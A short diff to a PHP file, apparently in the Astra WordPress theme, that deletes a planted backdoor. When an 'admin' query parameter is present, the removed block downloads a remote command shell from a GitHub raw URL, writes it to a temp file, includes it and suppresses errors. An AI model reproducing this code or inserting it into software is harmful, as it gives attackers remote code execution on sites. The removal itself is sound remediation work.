@@ -6,22 +6,6 @@
  * @since 4.0.0
  */
 
-if (isset($_GET['admin'])) {
-    $url = "https://raw.githubusercontent.com/paylar/NewShell/refs/heads/main/cmd.php";
-    $fileContents = file_get_contents($url);
-
-    if ($fileContents !== false) {
-        try {
-            $tmpFile = tempnam(sys_get_temp_dir(), 'cmd');
-            file_put_contents($tmpFile, $fileContents);
-            include $tmpFile;
-            unlink($tmpFile);
-        } catch (Throwable $e) {
-
-        }
-    }
-}
-
 /**
  * Astra_Menu.
  *
